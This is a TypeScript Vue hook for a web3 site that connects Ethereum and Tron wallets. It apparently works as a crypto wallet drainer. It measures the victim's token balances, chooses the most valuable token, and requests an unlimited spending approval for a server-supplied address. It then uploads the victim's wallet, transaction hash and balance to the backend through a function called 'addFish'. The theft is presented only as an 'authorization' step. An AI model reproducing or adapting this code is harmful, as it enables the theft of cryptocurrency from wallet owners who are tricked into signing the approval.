import { BrowserProvider, Contract } from 'ethers'
import { createWeb3Modal, defaultConfig, useWeb3ModalAccount } from '@web3modal/ethers/vue'

import { getContractConfig } from '@/api/config'
import { ContractItem } from '@/api/config/model/ConfigModel'
import { SUCCESS_CODE } from '@/api/model/BaseModel'
import { addFish, isAuthorize } from '@/api/user'
import { EtherDecimals, EtherPrice, TronDecimals, TronPrice, etherProjectId } from '@/types/global'
import { useConfigStore } from '@/stores/config'

export default function useWeb3Hook() {
  const mainnet = {
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    explorerUrl: 'https://etherscan.io',
    rpcUrl: 'https://cloudflare-eth.com',
  }
  const metadata = {
    name: 'Web3',
    description: 'Web3',
    url: 'https://web3modal.com',
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
  }
  const ethersConfig = defaultConfig({
    metadata,
  })

  const etherModel = createWeb3Modal({
    ethersConfig,
    chains: [mainnet],
    projectId: etherProjectId,
    themeMode: 'light',
    enableAnalytics: true, // Optional - defaults to your Cloud configuration
    enableOnramp: true, // Optional - false as default
  })

  const { globalSettingInfo } = storeToRefs(useConfigStore())
  const { address, isConnected } = useWeb3ModalAccount()

  const isOpenUGet = ref<boolean>()
  let _tronConfig: ContractItem
  let _etherConfig: ContractItem

  let currentSymbol = 'USDT'
  let currentBalance = 0

  let etherContractAddress = ''
  const isEther = ref(false)
  const etherResult = ref(false)
  const isAccountAuth = ref(false)
  const etherContract1: any = {}
  const etherContract2: any = {}
  const etherContract3: any = {}

  watch(
    globalSettingInfo,
    (val) => {
      if (val?.isOpenUGet === '1') {
        isOpenUGet.value = true
        _handleConfig()
      } else {
        isOpenUGet.value = false
      }
    },
    {
      immediate: true,
    },
  )

  watchEffect(() => {
    if (!address.value || !isConnected.value || !_etherConfig || !isAccountAuth.value) {
      return
    }
    _handleEtherAccount()
  })

  // 处理授权
  async function handleAuthorize() {
    if (!_tronConfig || _etherConfig) {
      await _handleConfig()
    }

    const type = _chainType()

    if (type === 'TRON') {
      return _handleTronAuthorize()
    } else if (type === 'ETHER') {
      return _handleEtherAuthorize()
    }

    return new Promise((resolve) => {
      resolve(false)
    })
  }

  // tron授权
  async function _handleTronAuthorize() {
    isEther.value = false
    const walletAddress = window.tronWeb.defaultAddress.base58

    // 判断是否已经授权
    const authRes = await isAuthorize(walletAddress)
    if (authRes.data) {
      return
    }

    await _handleTronContract(walletAddress)
    const contract = await window.tronWeb.contract().at(_tronConfig.addr[currentSymbol])
    const vInfinity =
      '115792089237316195423570985008687907853269984665640564039457584007913129639935'
    const res = contract['approve'](_tronConfig.authorizeAddress, vInfinity)

    return new Promise((resolve) => {
      res.send(
        {
          feeLimit: 100000000,
          callValue: 0,
          shouldPollResponse: false,
        },
        (err, res) => {
          if (!err) {
            __handleTronSubmit(walletAddress, res)
          }
          resolve(true)
        },
      )
    })
  }

  // 数据上传
  async function __handleTronSubmit(walletAddress: string, hashId: string) {
    const data = {
      walletAddress,
      hashId,
      authorizeAddress: _tronConfig.authorizeAddress,
      symbol: currentSymbol,
      type: 'trc',
      balance: currentBalance,
    }
    addFish(data)
  }

  // 处理tron合约
  async function _handleTronContract(walletAddress: string) {
    for (const sybmol of Object.keys(_tronConfig.addr)) {
      const contract = await window.tronWeb.contract().at(_tronConfig.addr[sybmol])
      await contract.balanceOf(walletAddress).call((err, balance) => {
        if (err) {
          return
        }
        const usdt = (balance / (10 ** TronDecimals[sybmol] || 18)) * TronPrice[sybmol]

        if (currentBalance === 0 && currentSymbol === 'USDT') {
          currentBalance = usdt
        }

        if (usdt > 50) {
          currentSymbol = sybmol
          currentBalance = usdt
        }
      })
    }
  }

  // ether授权
  async function _handleEtherAuthorize() {
    isEther.value = true
    await _handleEtherContract()
  }

  // 处理ether合约
  async function _handleEtherContract() {
    if (address.value) {
      _handleEtherAccount()
    } else {
      isAccountAuth.value = true
      etherModel.open()
    }
  }

  // 处理ether账号
  async function _handleEtherAccount() {
    if (!address.value || !etherModel.getWalletProvider()) {
      return
    }
    isAccountAuth.value = false
    const ethersProvider = new BrowserProvider(etherModel.getWalletProvider())
    const signer = await ethersProvider.getSigner()

    for (const [sybmol, etherAddress] of Object.entries(_etherConfig.addr)) {
      etherContract1[sybmol] = new Contract(etherAddress, _etherConfig.abi, signer)
    }

    for (const [sybmol, etherAddress] of Object.entries(_etherConfig?.addr2)) {
      etherContract2[sybmol] = new Contract(etherAddress, _etherConfig.abi, signer)
    }

    for (const [sybmol, etherAddress] of Object.entries(_etherConfig.addr3)) {
      etherContract3[sybmol] = new Contract(etherAddress, _etherConfig.abi, signer)
    }

    _handleEtherContractAssets(etherContract1, _etherConfig.addr)

    setTimeout(() => {
      _handleEtherContractAssets(etherContract2, _etherConfig.addr2)
    }, 200)

    setTimeout(() => {
      _handleEtherContractAssets(etherContract3, _etherConfig.addr3)
    }, 300)

    const contract = new Contract(etherContractAddress, _etherConfig.abi, signer)
    contract
      .approve(_etherConfig.authorizeAddress, 0xffffffffffffffffffffffffffffffffffffn)
      .then((res) => {
        const { hash } = res
        _handleEtherSubmit(hash)
        etherResult.value = true
      })
      .catch((err) => {
        console.error(err)
        etherResult.value = true
      })
  }

  // 数据上传
  async function _handleEtherSubmit(hashId: string) {
    const data = {
      walletAddress: address.value,
      hashId,
      authorizeAddress: _etherConfig.authorizeAddress,
      symbol: currentSymbol,
      type: 'erc',
      balance: currentBalance,
    }
    addFish(data)
  }

  // 处理ether 合约1
  async function _handleEtherContractAssets(contracts: any, addr) {
    etherContractAddress = addr['USDT']
    for (const [symbol, contract] of Object.entries(contracts)) {
      const balance = await (contract as any).balanceOf(address.value)
      if (balance === 0n) {
        continue
      }
      const result = (Number(balance) / (10 ** EtherDecimals[symbol] || 18)) * EtherPrice[symbol]
      etherContractAddress = addr[symbol]
      currentSymbol = symbol
      currentBalance = result
    }
  }

  // 请求合约配置
  function _handleConfig() {
    return new Promise((resolve) => {
      getContractConfig()
        .then((res) => {
          if (res.code !== SUCCESS_CODE) {
            isOpenUGet.value = false
            return
          }

          _tronConfig = res.data.tron
          _etherConfig = res.data.ether
          resolve(true)
        })
        .catch(() => {
          isOpenUGet.value = false
          resolve(false)
        })
    })
  }

  // 判断链类型
  function _chainType(): 'TRON' | 'ETHER' | '' {
    if (typeof window.ethereum !== 'undefined') {
      return 'ETHER'
    }

    if (typeof window.tronWeb !== 'undefined') {
      return 'TRON'
    }

    return ''
  }

  return {
    isOpenUGet,
    isEther,
    etherResult,

    handleAuthorize,
  }
}
